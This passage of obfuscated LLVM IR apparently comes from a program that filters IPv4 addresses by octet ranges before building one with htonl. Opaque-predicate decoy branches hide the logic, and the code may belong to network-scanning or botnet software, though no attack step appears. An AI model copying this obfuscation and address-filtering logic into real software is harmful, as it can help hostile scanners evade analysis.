  br i1 %4850, label %4851, label %4891

; <label>:4851:                                   ; preds = %4847
  %4852 = load i32, i32* @x.57
  %4853 = load i32, i32* @y.58
  %4854 = sub i32 %4852, 1
  %4855 = mul i32 %4852, %4854
  %4856 = urem i32 %4855, 2
  %4857 = icmp eq i32 %4856, 0
  %4858 = icmp slt i32 %4853, 10
  %4859 = or i1 %4857, %4858
  br i1 %4859, label %originalBB674, label %originalBB674alteredBB

originalBB674:                                    ; preds = %originalBB674alteredBB, %4851
  %4860 = load i8, i8* %4, align 1
  %4861 = zext i8 %4860 to i32
  %4862 = icmp sge i32 %4861, 128
  %4863 = load i32, i32* @x.57
  %4864 = load i32, i32* @y.58
  %4865 = sub i32 %4863, 1
  %4866 = mul i32 %4863, %4865
  %4867 = urem i32 %4866, 2
  %4868 = icmp eq i32 %4867, 0
  %4869 = icmp slt i32 %4864, 10
  %4870 = or i1 %4868, %4869
  br i1 %4870, label %originalBBpart2676, label %originalBB674alteredBB

originalBBpart2676:                               ; preds = %originalBB674
  br i1 %4862, label %4871, label %4891

; <label>:4871:                                   ; preds = %originalBBpart2676
  %4872 = load i32, i32* @x.57
  %4873 = load i32, i32* @y.58
  %4874 = sub i32 %4872, 1
  %4875 = mul i32 %4872, %4874
  %4876 = urem i32 %4875, 2
  %4877 = icmp eq i32 %4876, 0
  %4878 = icmp slt i32 %4873, 10
  %4879 = or i1 %4877, %4878
  br i1 %4879, label %originalBB678, label %originalBB678alteredBB

originalBB678:                                    ; preds = %originalBB678alteredBB, %4871
  %4880 = load i8, i8* %4, align 1
  %4881 = zext i8 %4880 to i32
  %4882 = icmp slt i32 %4881, 255
  %4883 = load i32, i32* @x.57
  %4884 = load i32, i32* @y.58
  %4885 = sub i32 %4883, 1
  %4886 = mul i32 %4883, %4885
  %4887 = urem i32 %4886, 2
  %4888 = icmp eq i32 %4887, 0
  %4889 = icmp slt i32 %4884, 10
  %4890 = or i1 %4888, %4889
  br i1 %4890, label %originalBBpart2680, label %originalBB678alteredBB

originalBBpart2680:                               ; preds = %originalBB678
  br i1 %4882, label %5259, label %4891

; <label>:4891:                                   ; preds = %originalBBpart2680, %originalBBpart2676, %4847, %4843
  %4892 = load i8, i8* %2, align 1
  %4893 = zext i8 %4892 to i32
  %4894 = icmp eq i32 %4893, 212
  br i1 %4894, label %4895, label %4955

; <label>:4895:                                   ; preds = %4891
  %4896 = load i32, i32* @x.57
  %4897 = load i32, i32* @y.58
  %4898 = sub i32 %4896, 1
  %4899 = mul i32 %4896, %4898
  %4900 = urem i32 %4899, 2
  %4901 = icmp eq i32 %4900, 0
  %4902 = icmp slt i32 %4897, 10
  %4903 = or i1 %4901, %4902
  br i1 %4903, label %originalBB682, label %originalBB682alteredBB

originalBB682:                                    ; preds = %originalBB682alteredBB, %4895
  %4904 = load i8, i8* %3, align 1
  %4905 = zext i8 %4904 to i32
  %4906 = icmp eq i32 %4905, 47
  %4907 = load i32, i32* @x.57
  %4908 = load i32, i32* @y.58
  %4909 = sub i32 %4907, 1
  %4910 = mul i32 %4907, %4909
  %4911 = urem i32 %4910, 2
  %4912 = icmp eq i32 %4911, 0
  %4913 = icmp slt i32 %4908, 10
  %4914 = or i1 %4912, %4913
  br i1 %4914, label %originalBBpart2684, label %originalBB682alteredBB

originalBBpart2684:                               ; preds = %originalBB682
  br i1 %4906, label %4915, label %4955

; <label>:4915:                                   ; preds = %originalBBpart2684
  %4916 = load i32, i32* @x.57
  %4917 = load i32, i32* @y.58
  %4918 = sub i32 %4916, 1
  %4919 = mul i32 %4916, %4918
  %4920 = urem i32 %4919, 2
  %4921 = icmp eq i32 %4920, 0
  %4922 = icmp slt i32 %4917, 10
  %4923 = or i1 %4921, %4922
  br i1 %4923, label %originalBB686, label %originalBB686alteredBB

originalBB686:                                    ; preds = %originalBB686alteredBB, %4915
  %4924 = load i8, i8* %4, align 1
  %4925 = zext i8 %4924 to i32
  %4926 = icmp sge i32 %4925, 224
  %4927 = load i32, i32* @x.57
  %4928 = load i32, i32* @y.58
  %4929 = sub i32 %4927, 1
  %4930 = mul i32 %4927, %4929
  %4931 = urem i32 %4930, 2
  %4932 = icmp eq i32 %4931, 0
  %4933 = icmp slt i32 %4928, 10
  %4934 = or i1 %4932, %4933
  br i1 %4934, label %originalBBpart2688, label %originalBB686alteredBB

originalBBpart2688:                               ; preds = %originalBB686
  br i1 %4926, label %4935, label %4955

; <label>:4935:                                   ; preds = %originalBBpart2688
  %4936 = load i32, i32* @x.57
  %4937 = load i32, i32* @y.58
  %4938 = sub i32 %4936, 1
  %4939 = mul i32 %4936, %4938
  %4940 = urem i32 %4939, 2
  %4941 = icmp eq i32 %4940, 0
  %4942 = icmp slt i32 %4937, 10
  %4943 = or i1 %4941, %4942
  br i1 %4943, label %originalBB690, label %originalBB690alteredBB

originalBB690:                                    ; preds = %originalBB690alteredBB, %4935
  %4944 = load i8, i8* %4, align 1
  %4945 = zext i8 %4944 to i32
  %4946 = icmp slt i32 %4945, 255
  %4947 = load i32, i32* @x.57
  %4948 = load i32, i32* @y.58
  %4949 = sub i32 %4947, 1
  %4950 = mul i32 %4947, %4949
  %4951 = urem i32 %4950, 2
  %4952 = icmp eq i32 %4951, 0
  %4953 = icmp slt i32 %4948, 10
  %4954 = or i1 %4952, %4953
  br i1 %4954, label %originalBBpart2692, label %originalBB690alteredBB

originalBBpart2692:                               ; preds = %originalBB690
  br i1 %4946, label %5259, label %4955

; <label>:4955:                                   ; preds = %originalBBpart2692, %originalBBpart2688, %originalBBpart2684, %4891
  %4956 = load i8, i8* %2, align 1
  %4957 = zext i8 %4956 to i32
  %4958 = icmp eq i32 %4957, 89
  br i1 %4958, label %4959, label %5003

; <label>:4959:                                   ; preds = %4955
  %4960 = load i32, i32* @x.57
  %4961 = load i32, i32* @y.58
  %4962 = sub i32 %4960, 1
  %4963 = mul i32 %4960, %4962
  %4964 = urem i32 %4963, 2
  %4965 = icmp eq i32 %4964, 0
  %4966 = icmp slt i32 %4961, 10
  %4967 = or i1 %4965, %4966
  br i1 %4967, label %originalBB694, label %originalBB694alteredBB

originalBB694:                                    ; preds = %originalBB694alteredBB, %4959
  %4968 = load i8, i8* %3, align 1
  %4969 = zext i8 %4968 to i32
  %4970 = icmp eq i32 %4969, 34
  %4971 = load i32, i32* @x.57
  %4972 = load i32, i32* @y.58
  %4973 = sub i32 %4971, 1
  %4974 = mul i32 %4971, %4973
  %4975 = urem i32 %4974, 2
  %4976 = icmp eq i32 %4975, 0
  %4977 = icmp slt i32 %4972, 10
  %4978 = or i1 %4976, %4977
  br i1 %4978, label %originalBBpart2696, label %originalBB694alteredBB

originalBBpart2696:                               ; preds = %originalBB694
  br i1 %4970, label %4979, label %5003

; <label>:4979:                                   ; preds = %originalBBpart2696
  %4980 = load i8, i8* %4, align 1
  %4981 = zext i8 %4980 to i32
  %4982 = icmp sge i32 %4981, 96
  br i1 %4982, label %4983, label %5003

; <label>:4983:                                   ; preds = %4979
  %4984 = load i32, i32* @x.57
  %4985 = load i32, i32* @y.58
  %4986 = sub i32 %4984, 1
  %4987 = mul i32 %4984, %4986
  %4988 = urem i32 %4987, 2
  %4989 = icmp eq i32 %4988, 0
  %4990 = icmp slt i32 %4985, 10
  %4991 = or i1 %4989, %4990
  br i1 %4991, label %originalBB698, label %originalBB698alteredBB

originalBB698:                                    ; preds = %originalBB698alteredBB, %4983
  %4992 = load i8, i8* %4, align 1
  %4993 = zext i8 %4992 to i32
  %4994 = icmp slt i32 %4993, 97
  %4995 = load i32, i32* @x.57
  %4996 = load i32, i32* @y.58
  %4997 = sub i32 %4995, 1
  %4998 = mul i32 %4995, %4997
  %4999 = urem i32 %4998, 2
  %5000 = icmp eq i32 %4999, 0
  %5001 = icmp slt i32 %4996, 10
  %5002 = or i1 %5000, %5001
  br i1 %5002, label %originalBBpart2700, label %originalBB698alteredBB

originalBBpart2700:                               ; preds = %originalBB698
  br i1 %4994, label %5259, label %5003

; <label>:5003:                                   ; preds = %originalBBpart2700, %4979, %originalBBpart2696, %4955
  %5004 = load i8, i8* %2, align 1
  %5005 = zext i8 %5004 to i32
  %5006 = icmp eq i32 %5005, 219
  br i1 %5006, label %5007, label %5031

; <label>:5007:                                   ; preds = %5003
  %5008 = load i8, i8* %3, align 1
  %5009 = zext i8 %5008 to i32
  %5010 = icmp sge i32 %5009, 216
  br i1 %5010, label %5011, label %5031

; <label>:5011:                                   ; preds = %5007
  %5012 = load i32, i32* @x.57
  %5013 = load i32, i32* @y.58
  %5014 = sub i32 %5012, 1
  %5015 = mul i32 %5012, %5014
  %5016 = urem i32 %5015, 2
  %5017 = icmp eq i32 %5016, 0
  %5018 = icmp slt i32 %5013, 10
  %5019 = or i1 %5017, %5018
  br i1 %5019, label %originalBB702, label %originalBB702alteredBB

originalBB702:                                    ; preds = %originalBB702alteredBB, %5011
  %5020 = load i8, i8* %3, align 1
  %5021 = zext i8 %5020 to i32
  %5022 = icmp slt i32 %5021, 231
  %5023 = load i32, i32* @x.57
  %5024 = load i32, i32* @y.58
  %5025 = sub i32 %5023, 1
  %5026 = mul i32 %5023, %5025
  %5027 = urem i32 %5026, 2
  %5028 = icmp eq i32 %5027, 0
  %5029 = icmp slt i32 %5024, 10
  %5030 = or i1 %5028, %5029
  br i1 %5030, label %originalBBpart2704, label %originalBB702alteredBB

originalBBpart2704:                               ; preds = %originalBB702
  br i1 %5022, label %5259, label %5031

; <label>:5031:                                   ; preds = %originalBBpart2704, %5007, %5003
  %5032 = load i8, i8* %2, align 1
  %5033 = zext i8 %5032 to i32
  %5034 = icmp eq i32 %5033, 23
  br i1 %5034, label %5035, label %5059

; <label>:5035:                                   ; preds = %5031
  %5036 = load i8, i8* %3, align 1
  %5037 = zext i8 %5036 to i32
  %5038 = icmp sge i32 %5037, 94
  br i1 %5038, label %5039, label %5059

; <label>:5039:                                   ; preds = %5035
  %5040 = load i32, i32* @x.57
  %5041 = load i32, i32* @y.58
  %5042 = sub i32 %5040, 1
  %5043 = mul i32 %5040, %5042
  %5044 = urem i32 %5043, 2
  %5045 = icmp eq i32 %5044, 0
  %5046 = icmp slt i32 %5041, 10
  %5047 = or i1 %5045, %5046
  br i1 %5047, label %originalBB706, label %originalBB706alteredBB

originalBB706:                                    ; preds = %originalBB706alteredBB, %5039
  %5048 = load i8, i8* %3, align 1
  %5049 = zext i8 %5048 to i32
  %5050 = icmp slt i32 %5049, 109
  %5051 = load i32, i32* @x.57
  %5052 = load i32, i32* @y.58
  %5053 = sub i32 %5051, 1
  %5054 = mul i32 %5051, %5053
  %5055 = urem i32 %5054, 2
  %5056 = icmp eq i32 %5055, 0
  %5057 = icmp slt i32 %5052, 10
  %5058 = or i1 %5056, %5057
  br i1 %5058, label %originalBBpart2708, label %originalBB706alteredBB

originalBBpart2708:                               ; preds = %originalBB706
  br i1 %5050, label %5259, label %5059

; <label>:5059:                                   ; preds = %originalBBpart2708, %5035, %5031
  %5060 = load i8, i8* %2, align 1
  %5061 = zext i8 %5060 to i32
  %5062 = icmp eq i32 %5061, 178
  br i1 %5062, label %5063, label %5103

; <label>:5063:                                   ; preds = %5059
  %5064 = load i32, i32* @x.57
  %5065 = load i32, i32* @y.58
  %5066 = sub i32 %5064, 1
  %5067 = mul i32 %5064, %5066
  %5068 = urem i32 %5067, 2
  %5069 = icmp eq i32 %5068, 0
  %5070 = icmp slt i32 %5065, 10
  %5071 = or i1 %5069, %5070
  br i1 %5071, label %originalBB710, label %originalBB710alteredBB

originalBB710:                                    ; preds = %originalBB710alteredBB, %5063
  %5072 = load i8, i8* %3, align 1
  %5073 = zext i8 %5072 to i32
  %5074 = icmp sge i32 %5073, 62
  %5075 = load i32, i32* @x.57
  %5076 = load i32, i32* @y.58
  %5077 = sub i32 %5075, 1
  %5078 = mul i32 %5075, %5077
  %5079 = urem i32 %5078, 2
  %5080 = icmp eq i32 %5079, 0
  %5081 = icmp slt i32 %5076, 10
  %5082 = or i1 %5080, %5081
  br i1 %5082, label %originalBBpart2712, label %originalBB710alteredBB

originalBBpart2712:                               ; preds = %originalBB710
  br i1 %5074, label %5083, label %5103

; <label>:5083:                                   ; preds = %originalBBpart2712
  %5084 = load i32, i32* @x.57
  %5085 = load i32, i32* @y.58
  %5086 = sub i32 %5084, 1
  %5087 = mul i32 %5084, %5086
  %5088 = urem i32 %5087, 2
  %5089 = icmp eq i32 %5088, 0
  %5090 = icmp slt i32 %5085, 10
  %5091 = or i1 %5089, %5090
  br i1 %5091, label %originalBB714, label %originalBB714alteredBB

originalBB714:                                    ; preds = %originalBB714alteredBB, %5083
  %5092 = load i8, i8* %3, align 1
  %5093 = zext i8 %5092 to i32
  %5094 = icmp slt i32 %5093, 63
  %5095 = load i32, i32* @x.57
  %5096 = load i32, i32* @y.58
  %5097 = sub i32 %5095, 1
  %5098 = mul i32 %5095, %5097
  %5099 = urem i32 %5098, 2
  %5100 = icmp eq i32 %5099, 0
  %5101 = icmp slt i32 %5096, 10
  %5102 = or i1 %5100, %5101
  br i1 %5102, label %originalBBpart2716, label %originalBB714alteredBB

originalBBpart2716:                               ; preds = %originalBB714
  br i1 %5094, label %5259, label %5103

; <label>:5103:                                   ; preds = %originalBBpart2716, %originalBBpart2712, %5059
  %5104 = load i8, i8* %2, align 1
  %5105 = zext i8 %5104 to i32
  %5106 = icmp eq i32 %5105, 106
  br i1 %5106, label %5107, label %5115

; <label>:5107:                                   ; preds = %5103
  %5108 = load i8, i8* %3, align 1
  %5109 = zext i8 %5108 to i32
  %5110 = icmp sge i32 %5109, 182
  br i1 %5110, label %5111, label %5115

; <label>:5111:                                   ; preds = %5107
  %5112 = load i8, i8* %3, align 1
  %5113 = zext i8 %5112 to i32
  %5114 = icmp slt i32 %5113, 189
  br i1 %5114, label %5259, label %5115

; <label>:5115:                                   ; preds = %5111, %5107, %5103
  %5116 = load i8, i8* %2, align 1
  %5117 = zext i8 %5116 to i32
  %5118 = icmp eq i32 %5117, 34
  br i1 %5118, label %5119, label %5143

; <label>:5119:                                   ; preds = %5115
  %5120 = load i32, i32* @x.57
  %5121 = load i32, i32* @y.58
  %5122 = sub i32 %5120, 1
  %5123 = mul i32 %5120, %5122
  %5124 = urem i32 %5123, 2
  %5125 = icmp eq i32 %5124, 0
  %5126 = icmp slt i32 %5121, 10
  %5127 = or i1 %5125, %5126
  br i1 %5127, label %originalBB718, label %originalBB718alteredBB

originalBB718:                                    ; preds = %originalBB718alteredBB, %5119
  %5128 = load i8, i8* %3, align 1
  %5129 = zext i8 %5128 to i32
  %5130 = icmp sge i32 %5129, 245
  %5131 = load i32, i32* @x.57
  %5132 = load i32, i32* @y.58
  %5133 = sub i32 %5131, 1
  %5134 = mul i32 %5131, %5133
  %5135 = urem i32 %5134, 2
  %5136 = icmp eq i32 %5135, 0
  %5137 = icmp slt i32 %5132, 10
  %5138 = or i1 %5136, %5137
  br i1 %5138, label %originalBBpart2720, label %originalBB718alteredBB

originalBBpart2720:                               ; preds = %originalBB718
  br i1 %5130, label %5139, label %5143

; <label>:5139:                                   ; preds = %originalBBpart2720
  %5140 = load i8, i8* %3, align 1
  %5141 = zext i8 %5140 to i32
  %5142 = icmp slt i32 %5141, 255
  br i1 %5142, label %5259, label %5143

; <label>:5143:                                   ; preds = %5139, %originalBBpart2720, %5115
  %5144 = load i8, i8* %2, align 1
  %5145 = zext i8 %5144 to i32
  %5146 = icmp eq i32 %5145, 87
  br i1 %5146, label %5147, label %5155

; <label>:5147:                                   ; preds = %5143
  %5148 = load i8, i8* %3, align 1
  %5149 = zext i8 %5148 to i32
  %5150 = icmp sge i32 %5149, 97
  br i1 %5150, label %5151, label %5155

; <label>:5151:                                   ; preds = %5147
  %5152 = load i8, i8* %3, align 1
  %5153 = zext i8 %5152 to i32
  %5154 = icmp slt i32 %5153, 99
  br i1 %5154, label %5259, label %5155

; <label>:5155:                                   ; preds = %5151, %5147, %5143
  %5156 = load i8, i8* %2, align 1
  %5157 = zext i8 %5156 to i32
  %5158 = icmp eq i32 %5157, 86
  br i1 %5158, label %5159, label %5163

; <label>:5159:                                   ; preds = %5155
  %5160 = load i8, i8* %3, align 1
  %5161 = zext i8 %5160 to i32
  %5162 = icmp eq i32 %5161, 208
  br i1 %5162, label %5259, label %5163

; <label>:5163:                                   ; preds = %5159, %5155
  %5164 = load i8, i8* %2, align 1
  %5165 = zext i8 %5164 to i32
  %5166 = icmp eq i32 %5165, 86
  br i1 %5166, label %5167, label %5171

; <label>:5167:                                   ; preds = %5163
  %5168 = load i8, i8* %3, align 1
  %5169 = zext i8 %5168 to i32
  %5170 = icmp eq i32 %5169, 209
  br i1 %5170, label %5259, label %5171

; <label>:5171:                                   ; preds = %5167, %5163
  %5172 = load i32, i32* @x.57
  %5173 = load i32, i32* @y.58
  %5174 = sub i32 %5172, 1
  %5175 = mul i32 %5172, %5174
  %5176 = urem i32 %5175, 2
  %5177 = icmp eq i32 %5176, 0
  %5178 = icmp slt i32 %5173, 10
  %5179 = or i1 %5177, %5178
  br i1 %5179, label %originalBB722, label %originalBB722alteredBB

originalBB722:                                    ; preds = %originalBB722alteredBB, %5171
  %5180 = load i8, i8* %2, align 1
  %5181 = zext i8 %5180 to i32
  %5182 = icmp eq i32 %5181, 193
  %5183 = load i32, i32* @x.57
  %5184 = load i32, i32* @y.58
  %5185 = sub i32 %5183, 1
  %5186 = mul i32 %5183, %5185
  %5187 = urem i32 %5186, 2
  %5188 = icmp eq i32 %5187, 0
  %5189 = icmp slt i32 %5184, 10
  %5190 = or i1 %5188, %5189
  br i1 %5190, label %originalBBpart2724, label %originalBB722alteredBB

originalBBpart2724:                               ; preds = %originalBB722
  br i1 %5182, label %5191, label %5195

; <label>:5191:                                   ; preds = %originalBBpart2724
  %5192 = load i8, i8* %3, align 1
  %5193 = zext i8 %5192 to i32
  %5194 = icmp eq i32 %5193, 164
  br i1 %5194, label %5259, label %5195

; <label>:5195:                                   ; preds = %5191, %originalBBpart2724
  %5196 = load i8, i8* %2, align 1
  %5197 = zext i8 %5196 to i32
  %5198 = icmp eq i32 %5197, 120
  br i1 %5198, label %5199, label %5223

; <label>:5199:                                   ; preds = %5195
  %5200 = load i8, i8* %3, align 1
  %5201 = zext i8 %5200 to i32
  %5202 = icmp sge i32 %5201, 103
  br i1 %5202, label %5203, label %5223

; <label>:5203:                                   ; preds = %5199
  %5204 = load i32, i32* @x.57
  %5205 = load i32, i32* @y.58
  %5206 = sub i32 %5204, 1
  %5207 = mul i32 %5204, %5206
  %5208 = urem i32 %5207, 2
  %5209 = icmp eq i32 %5208, 0
  %5210 = icmp slt i32 %5205, 10
  %5211 = or i1 %5209, %5210
  br i1 %5211, label %originalBB726, label %originalBB726alteredBB

originalBB726:                                    ; preds = %originalBB726alteredBB, %5203
  %5212 = load i8, i8* %3, align 1
  %5213 = zext i8 %5212 to i32
  %5214 = icmp slt i32 %5213, 108
  %5215 = load i32, i32* @x.57
  %5216 = load i32, i32* @y.58
  %5217 = sub i32 %5215, 1
  %5218 = mul i32 %5215, %5217
  %5219 = urem i32 %5218, 2
  %5220 = icmp eq i32 %5219, 0
  %5221 = icmp slt i32 %5216, 10
  %5222 = or i1 %5220, %5221
  br i1 %5222, label %originalBBpart2728, label %originalBB726alteredBB

originalBBpart2728:                               ; preds = %originalBB726
  br i1 %5214, label %5259, label %5223

; <label>:5223:                                   ; preds = %originalBBpart2728, %5199, %5195
  %5224 = load i8, i8* %2, align 1
  %5225 = zext i8 %5224 to i32
  %5226 = icmp eq i32 %5225, 188
  br i1 %5226, label %5227, label %5247

; <label>:5227:                                   ; preds = %5223
  %5228 = load i32, i32* @x.57
  %5229 = load i32, i32* @y.58
  %5230 = sub i32 %5228, 1
  %5231 = mul i32 %5228, %5230
  %5232 = urem i32 %5231, 2
  %5233 = icmp eq i32 %5232, 0
  %5234 = icmp slt i32 %5229, 10
  %5235 = or i1 %5233, %5234
  br i1 %5235, label %originalBB730, label %originalBB730alteredBB

originalBB730:                                    ; preds = %originalBB730alteredBB, %5227
  %5236 = load i8, i8* %3, align 1
  %5237 = zext i8 %5236 to i32
  %5238 = icmp eq i32 %5237, 68
  %5239 = load i32, i32* @x.57
  %5240 = load i32, i32* @y.58
  %5241 = sub i32 %5239, 1
  %5242 = mul i32 %5239, %5241
  %5243 = urem i32 %5242, 2
  %5244 = icmp eq i32 %5243, 0
  %5245 = icmp slt i32 %5240, 10
  %5246 = or i1 %5244, %5245
  br i1 %5246, label %originalBBpart2732, label %originalBB730alteredBB

originalBBpart2732:                               ; preds = %originalBB730
  br i1 %5238, label %5259, label %5247

; <label>:5247:                                   ; preds = %originalBBpart2732, %5223
  %5248 = load i8, i8* %2, align 1
  %5249 = zext i8 %5248 to i32
  %5250 = icmp eq i32 %5249, 78
  br i1 %5250, label %5251, label %5255

; <label>:5251:                                   ; preds = %5247
  %5252 = load i8, i8* %3, align 1
  %5253 = zext i8 %5252 to i32
  %5254 = icmp eq i32 %5253, 46
  br i1 %5254, label %5259, label %5255

; <label>:5255:                                   ; preds = %5251, %5247
  %5256 = load i8, i8* %2, align 1
  %5257 = zext i8 %5256 to i32
  %5258 = icmp eq i32 %5257, 224
  br label %5259

; <label>:5259:                                   ; preds = %5255, %5251, %originalBBpart2732, %originalBBpart2728, %5191, %5167, %5159, %5151, %5139, %5111, %originalBBpart2716, %originalBBpart2708, %originalBBpart2704, %originalBBpart2700, %originalBBpart2692, %originalBBpart2680, %originalBBpart2672, %4811, %4803, %originalBBpart2664, %originalBBpart2652, %originalBBpart2648, %4643, %4631, %4587, %originalBBpart2624, %originalBBpart2612, %4451, %4403, %4387, %originalBBpart2596, %originalBBpart2584, %4243, %4195, %4147, %4115, %originalBBpart2548, %4019, %3971, %3955, %3923, %originalBBpart2524, %3843, %3827, %3779, %originalBBpart2508, %3731, %3723, %3715, %3691, %originalBBpart2492, %3643, %3635, %3627, %originalBBpart2488, %3595, %3587, %3579, %originalBBpart2480, %originalBBpart2472, %3491, %3483, %3467, %3419, %originalBBpart2448, %3307, %3259, %3243, %3227, %3195, %originalBBpart2424, %3099, %originalBBpart2412, %originalBBpart2408, %originalBBpart2400, %2971, %2923, %2859, %2843, %2811, %originalBBpart2368, %2731, %2699, %2651, %2635, %originalBBpart2344, %2587, %2555, %2523, %originalBBpart2328, %originalBBpart2320, %originalBBpart2316, %2363, %2331, %2315, %2267, %2235, %2211, %2203, %originalBBpart2288, %2171, %2163, %originalBBpart2280, %2115, %originalBBpart2272, %originalBBpart2264, %2027, %2019, %originalBBpart2260, %1983, %1971, %originalBBpart2256, %1915, %1887, %1859, %originalBBpart2240, %1803, %1791, %originalBBpart2232, %1735, %1723, %1711, %1699, %1687, %1659, %1631, %1619, %1607, %originalBBpart2216, %originalBBpart2212, %1523, %1495, %1467, %1439, %1411, %1399, %1355, %1343, %originalBBpart2176, %1287, %1243, %1199, %originalBBpart2156, %originalBBpart2148, %originalBBpart2144, %1087, %1075, %originalBBpart2140, %1035, %1023, %1015, %originalBBpart2132, %943, %originalBBpart2124, %originalBBpart2120, %originalBBpart2112, %847, %823, %799, %775, %767, %759, %751, %727, %719, %originalBBpart292, %originalBBpart284, %647, %639, %631, %623, %599, %originalBBpart272, %551, %543, %535, %527, %519, %originalBBpart268, %487, %479, %471, %463, %455, %447, %439, %originalBBpart260, %originalBBpart256, %originalBBpart248, %originalBBpart244, %originalBBpart240, %279, %255, %251, %originalBBpart232, %originalBBpart228, %207, %203, %originalBBpart224, %originalBBpart220, %159, %155, %originalBBpart216, %originalBBpart212, %111, %originalBBpart28, %87, %originalBBpart24, %63, %59, %originalBBpart2, %35, %31, %27, %23
  %5260 = phi i1 [ true, %5251 ], [ true, %originalBBpart2732 ], [ true, %originalBBpart2728 ], [ true, %5191 ], [ true, %5167 ], [ true, %5159 ], [ true, %5151 ], [ true, %5139 ], [ true, %5111 ], [ true, %originalBBpart2716 ], [ true, %originalBBpart2708 ], [ true, %originalBBpart2704 ], [ true, %originalBBpart2700 ], [ true, %originalBBpart2692 ], [ true, %originalBBpart2680 ], [ true, %originalBBpart2672 ], [ true, %4811 ], [ true, %4803 ], [ true, %originalBBpart2664 ], [ true, %originalBBpart2652 ], [ true, %originalBBpart2648 ], [ true, %4643 ], [ true, %4631 ], [ true, %4587 ], [ true, %originalBBpart2624 ], [ true, %originalBBpart2612 ], [ true, %4451 ], [ true, %4403 ], [ true, %4387 ], [ true, %originalBBpart2596 ], [ true, %originalBBpart2584 ], [ true, %4243 ], [ true, %4195 ], [ true, %4147 ], [ true, %4115 ], [ true, %originalBBpart2548 ], [ true, %4019 ], [ true, %3971 ], [ true, %3955 ], [ true, %3923 ], [ true, %originalBBpart2524 ], [ true, %3843 ], [ true, %3827 ], [ true, %3779 ], [ true, %originalBBpart2508 ], [ true, %3731 ], [ true, %3723 ], [ true, %3715 ], [ true, %3691 ], [ true, %originalBBpart2492 ], [ true, %3643 ], [ true, %3635 ], [ true, %3627 ], [ true, %originalBBpart2488 ], [ true, %3595 ], [ true, %3587 ], [ true, %3579 ], [ true, %originalBBpart2480 ], [ true, %originalBBpart2472 ], [ true, %3491 ], [ true, %3483 ], [ true, %3467 ], [ true, %3419 ], [ true, %originalBBpart2448 ], [ true, %3307 ], [ true, %3259 ], [ true, %3243 ], [ true, %3227 ], [ true, %3195 ], [ true, %originalBBpart2424 ], [ true, %3099 ], [ true, %originalBBpart2412 ], [ true, %originalBBpart2408 ], [ true, %originalBBpart2400 ], [ true, %2971 ], [ true, %2923 ], [ true, %2859 ], [ true, %2843 ], [ true, %2811 ], [ true, %originalBBpart2368 ], [ true, %2731 ], [ true, %2699 ], [ true, %2651 ], [ true, %2635 ], [ true, %originalBBpart2344 ], [ true, %2587 ], [ true, %2555 ], [ true, %2523 ], [ true, %originalBBpart2328 ], [ true, %originalBBpart2320 ], [ true, %originalBBpart2316 ], [ true, %2363 ], [ true, %2331 ], [ true, %2315 ], [ true, %2267 ], [ true, %2235 ], [ true, %2211 ], [ true, %2203 ], [ true, %originalBBpart2288 ], [ true, %2171 ], [ true, %2163 ], [ true, %originalBBpart2280 ], [ true, %2115 ], [ true, %originalBBpart2272 ], [ true, %originalBBpart2264 ], [ true, %2027 ], [ true, %2019 ], [ true, %originalBBpart2260 ], [ true, %1983 ], [ true, %1971 ], [ true, %originalBBpart2256 ], [ true, %1915 ], [ true, %1887 ], [ true, %1859 ], [ true, %originalBBpart2240 ], [ true, %1803 ], [ true, %1791 ], [ true, %originalBBpart2232 ], [ true, %1735 ], [ true, %1723 ], [ true, %1711 ], [ true, %1699 ], [ true, %1687 ], [ true, %1659 ], [ true, %1631 ], [ true, %1619 ], [ true, %1607 ], [ true, %originalBBpart2216 ], [ true, %originalBBpart2212 ], [ true, %1523 ], [ true, %1495 ], [ true, %1467 ], [ true, %1439 ], [ true, %1411 ], [ true, %1399 ], [ true, %1355 ], [ true, %1343 ], [ true, %originalBBpart2176 ], [ true, %1287 ], [ true, %1243 ], [ true, %1199 ], [ true, %originalBBpart2156 ], [ true, %originalBBpart2148 ], [ true, %originalBBpart2144 ], [ true, %1087 ], [ true, %1075 ], [ true, %originalBBpart2140 ], [ true, %1035 ], [ true, %1023 ], [ true, %1015 ], [ true, %originalBBpart2132 ], [ true, %943 ], [ true, %originalBBpart2124 ], [ true, %originalBBpart2120 ], [ true, %originalBBpart2112 ], [ true, %847 ], [ true, %823 ], [ true, %799 ], [ true, %775 ], [ true, %767 ], [ true, %759 ], [ true, %751 ], [ true, %727 ], [ true, %719 ], [ true, %originalBBpart292 ], [ true, %originalBBpart284 ], [ true, %647 ], [ true, %639 ], [ true, %631 ], [ true, %623 ], [ true, %599 ], [ true, %originalBBpart272 ], [ true, %551 ], [ true, %543 ], [ true, %535 ], [ true, %527 ], [ true, %519 ], [ true, %originalBBpart268 ], [ true, %487 ], [ true, %479 ], [ true, %471 ], [ true, %463 ], [ true, %455 ], [ true, %447 ], [ true, %439 ], [ true, %originalBBpart260 ], [ true, %originalBBpart256 ], [ true, %originalBBpart248 ], [ true, %originalBBpart244 ], [ true, %originalBBpart240 ], [ true, %279 ], [ true, %255 ], [ true, %251 ], [ true, %originalBBpart232 ], [ true, %originalBBpart228 ], [ true, %207 ], [ true, %203 ], [ true, %originalBBpart224 ], [ true, %originalBBpart220 ], [ true, %159 ], [ true, %155 ], [ true, %originalBBpart216 ], [ true, %originalBBpart212 ], [ true, %111 ], [ true, %originalBBpart28 ], [ true, %87 ], [ true, %originalBBpart24 ], [ true, %63 ], [ true, %59 ], [ true, %originalBBpart2 ], [ true, %35 ], [ true, %31 ], [ true, %27 ], [ true, %23 ], [ %5258, %5255 ]
  br i1 %5260, label %6, label %5261

; <label>:5261:                                   ; preds = %5259
  %5262 = load i32, i32* @x.57
  %5263 = load i32, i32* @y.58
  %5264 = sub i32 %5262, 1
  %5265 = mul i32 %5262, %5264
  %5266 = urem i32 %5265, 2
  %5267 = icmp eq i32 %5266, 0
  %5268 = icmp slt i32 %5263, 10
  %5269 = or i1 %5267, %5268
  br i1 %5269, label %originalBB734, label %originalBB734alteredBB

originalBB734:                                    ; preds = %originalBB734alteredBB, %5261
  %5270 = load i8, i8* %2, align 1
  %5271 = zext i8 %5270 to i32
  %5272 = shl i32 %5271, 24
  %5273 = load i8, i8* %3, align 1
  %5274 = zext i8 %5273 to i32
  %5275 = shl i32 %5274, 16
  %5276 = or i32 %5272, %5275
  %5277 = load i8, i8* %4, align 1
  %5278 = zext i8 %5277 to i32
  %5279 = shl i32 %5278, 8
  %5280 = or i32 %5276, %5279
  %5281 = load i8, i8* %5, align 1
  %5282 = zext i8 %5281 to i32
  %5283 = shl i32 %5282, 0
  %5284 = or i32 %5280, %5283
  %5285 = call i32 @htonl(i32 %5284) #7
